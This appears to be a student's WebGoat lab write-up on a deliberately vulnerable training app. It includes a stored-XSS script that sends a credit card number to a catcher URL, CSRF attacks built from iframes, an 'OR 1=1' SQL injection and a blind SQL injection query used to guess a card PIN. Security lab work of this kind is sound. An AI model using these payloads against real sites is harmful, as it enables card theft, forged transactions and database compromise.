#abdullah siddiqi, 1002435572, arman.siddiqi@mail.utoronto.ca

Part 1 Explanation: Exploit was in the search box. Once its clicked a form is created which allows the user to input their credentials which is then sent to the url of the attackers choosing.

Part 2 Explanation: 
http://localhost:8990/WebGoat/start.mvc#attack/1908103370/900?input1=123&input2=<script>var creditcard = document.getElementsByName('input1')[0].value; var url ="catcher?PROPERTY=yes&stolenCreditCard=" + creditcard;document.getElementById('message').style.visibility = "hidden";$.ajax({         
type: "POST", url: url,     }); </script>

Exploits was in the input of "Enter Your 3 digit access code." From there the script inputed was able to access the credit card number once the purchase button was pressed as the creditcard number was send to the attack url through a post method. 

Part 3 Explanation:
The Message field is exploitable.

Part 4 Explanation:
The Message field is exploitable. There were two frames created. When the first frame loads, it will call the second frame with the correct src which is where the exploit happens.

Part 5 Explanation: 
The Message field is exploitable. Two iframes were created. The first gets the token from the input from and then creates a second hidden frame with this infromation and secretly complete the purchase.

Part 6 Explanation:
The input was " Siddiqi' OR 1=1 -- ". This input is always true as its either siddiqi or 1=1, thus this will return all rows.
Part 7 Explanation:
As there is no blocking of sql code, the exploit here is to simply input SQL attack strings that allow you to manipulate the database as you want

Part 8 Explanation:
101 AND ((SELECT pin FROM credit WHERE cc_number='1234123412341234') < x );
the 'x' in the above query string was simply changed through trial and error to find the range out desired outcome. If x led to a valid card, we lower x. If x led to an invalid input, we increase x. This led to finall finding the correct pin which was 4862. 


